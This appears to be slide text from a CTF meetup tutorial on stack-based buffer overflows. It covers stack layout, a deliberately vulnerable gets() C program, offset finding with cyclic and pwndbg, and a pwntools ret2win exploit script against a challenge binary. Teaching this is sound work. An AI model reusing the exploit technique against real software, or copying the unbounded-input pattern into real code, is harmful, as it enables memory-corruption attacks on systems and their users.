What is a Binary & PWN?

Bridging human-readable code to raw CPU instructions

From Code to Machine Language

A binary is a compiled executable containing machine instructions that the CPU processes directly (e.g. Linux ELF, Windows PE). 

Source Code (.c)
   │
   ▼  [gcc -o program main.c]
Assembly Code (.s)
   │
   ▼  [Assembler]
Machine Code / Binary ELF (.bin)
   └─► Executed directly by CPU registers & ALU

Computers do not understand C variables, functions, or bounds. They only execute a continuous sequence of instructions reading from and writing to raw memory addresses.

What is Binary Exploitation (PWN)?

PWN is the art of subverting compiled software by manipulating memory errors to hijack execution flow.

  • 🎯
    Hijack Control Flow: Steer the instruction pointer (RIP/EIP) to run unintended functions.
  • 🔓
    Bypass Protections: Circumvent security defenses like non-executable stacks, canaries, and ASLR.
  • 🚩
    Capture The Flag: Execute win(), dump memory flags, or spawn an interactive shell (/bin/sh).
"Turning a memory management bug into an unexpected feature for hackers."

The Stack

RW- (Read / Write)

The Stack manages function call frames, local variables (e.g. char buf[64]), and return addresses. It grows downward from high addresses to low addresses in memory.

⚔️ Security & Exploitation Relevance

Vulnerable to Stack-Based Buffer Overflows. Writing past local buffers allows an attacker to overwrite saved frame pointers (RBP) and return addresses (RIP), completely hijacking execution flow.

Anatomy of a Stack Frame

Why writing past a local variable reaches the return address

The Critical Conflict

When a function is called, a new stack frame is allocated:

  1. call function pushes the Return Address onto the stack.
  2. Function prologue executes: push rbp; mov rbp, rsp.
  3. Stack space is reserved for local variables by subtracting RSP: sub rsp, 0x40.

The Golden Rule of Stack Overflows:

The Stack grows downwards (High Address ➔ Low Address), but buffers are filled upwards (Low Address ➔ High Address towards the return address)!

Stack Frame Layout (x64)

[High Address] Function Arguments Caller Frame
🎯 Return Address (RIP) 8 Bytes
Saved Base Pointer (RBP) 8 Bytes
Local Buffer (e.g. char buf[64]) 64 Bytes
▲ Data is written upwards towards Saved RBP & RIP!
[Low Address - Top of Stack (RSP)]

Vulnerable C Functions

Where does the vulnerability come from in real source code?

Vulnerable Code Snippet

#include <stdio.h>

void vulnerable() {
    char buffer[64];

    printf("Enter your input: ");
    gets(buffer);  // ❌ NO BOUNDS CHECKING!

    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}

The programmer allocated 64 bytes for buffer, but gets() reads until a newline or EOF. An input of 80 bytes will overflow and corrupt the stack frame!

Dangerous vs Safe Functions

❌ Dangerous ✅ Safe Alternative Why it fails
gets(buf) fgets(buf, sizeof(buf), stdin) Reads infinitely until newline
strcpy(dst, src) strncpy(dst, src, n) Copies until null-byte without limits
sprintf(buf, ...) snprintf(buf, n, ...) Formatted string length unrestricted
scanf("%s", buf) scanf("%63s", buf) No maximum length specifier

32-bit (x86) vs 64-bit (x64) Differences

How architecture changes your exploit payload and gadget chains

x86 (32-bit) Architecture 4-Byte Pointers
  • Registers: EIP (Instruction), ESP (Stack), EBP (Base)
  • Pointer Size: 4 bytes (p32(addr))
  • Calling Convention: Arguments are passed entirely on the stack: 
    push arg2
push arg1
call function
  • Stack Alignment: Less strict alignment requirements. Easy direct jumps to target functions!
x64 (64-bit) Architecture 8-Byte Pointers
  • Registers: RIP, RSP, RBP + general registers R8 - R15
  • Pointer Size: 8 bytes (p64(addr))
  • Calling Convention: First 6 arguments are passed in registers: 
    RDI ➔ RSI ➔ RDX ➔ RCX ➔ R8 ➔ R9
  • ⚠️ The 16-byte Stack Alignment Trap:
    GLIBC functions (like printf or system) enforce 16-byte aligned RSP via movaps instructions. Jumping directly to win() can cause a crash! Fixed by prepending a ret gadget!

The ret2win Technique

Hijacking the return address to trigger an existing target function

Payload Structure

The exploit replaces the function's legitimate return address with the address of a hidden win() function:

Padding ('A' * Offset)
Fills local buffer + Saved RBP up to RIP
[Optional] ret Gadget (x64 only)
Aligns RSP to 16 bytes for GLIBC / printf
win() Function Address
Address found via Ghidra / readelf / pwntools

Execution Flow

1. Function completes its work
2. Executes function epilogue:
   leave  ➔  mov rsp, rbp; pop rbp
3. Executes ret:
   ret    ➔  pop rip; jmp rip
             ▲
             │ Instead of returning to main(),
             │ CPU pops our win() address!
             ▼
4. CPU jumps directly into win():
   win() prints:
   🎉 FLAG{x64_r3t2w1n_b4s1cs}

Finding the Offset: cyclic & pwndbg

Never guess how many bytes to send — calculate it mathematically

The 3-Step Methodology

  1. Generate De Bruijn Pattern: 
    pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaj...
  2. Crash the Target with Pattern: 
    pwndbg> run
Enter your input: [paste cyclic string]
Program received signal SIGSEGV (fault on 0x6161616a)
  3. Query the Exact Offset: 
    pwndbg> cyclic -l 0x6161616a
Finding cyclic pattern of length 4 with ...
Found at offset 72

Why De Bruijn Patterns?

A De Bruijn cyclic sequence has a mathematical property: every 4 or 8 byte substring is completely unique throughout the entire pattern.

No Guessing, Instant Accuracy:

Looking at whatever value lands in EIP/RIP or the top of the stack, cyclic -l immediately looks up the exact distance from the buffer start.

Crafting the Exploit with pwntools

Clean, robust Python exploit scripting for local & remote targets

x64 Exploit (solve.py) Python 3 
from pwn import *

# 1. Load target ELF
elf = ELF('./challenge')
context.binary = elf

# 2. Extract targets & gadgets
offset = 72
win_addr = elf.symbols['win']
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# 3. Assemble payload
payload = b'A' * offset
payload += p64(ret_gadget)  # 16-byte alignment
payload += p64(win_addr)

# 4. Dispatch
p = process('./challenge')
p.sendlineafter(b'input: ', payload)
p.interactive()

Binary Protections: checksec

Modern defenses designed to stop memory exploitation

checksec Output

$ checksec --file=./challenge
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

In our meetup challenges, No Canary and No PIE allow us to overwrite RIP with fixed function addresses directly.

Mitigation Matrix

  • NX / DEP (No-Execute):
    Marks stack non-executable. Stops injected shellcode, but does NOT stop ret2win or ROP.
  • Stack Canary:
    Random value before Saved RBP. If overwritten, triggers __stack_chk_fail and aborts before ret.
  • PIE (Position Independent Executable):
    Randomizes binary base address every run. Requires address leaks to bypass.
  • ASLR (Address Space Layout Randomization):
    Kernel feature randomizing stack, heap, and library (libc) bases.

Split Architecture Benefit

  • ⚡
    Native macOS Ghidra: Zero GUI cursor lag, full hardware acceleration, retina resolution.
  • 🐧
    Headless Colima (QEMU x86_64): Lightweight (~2GB RAM vs 8GB+ for full Kali VM).
  • 🔄
    Shared Filesystem: Files in macOS are automatically mapped inside Colima at /Users/...!

Cheat Sheet

# 2. Enter Linux shell
colima ssh
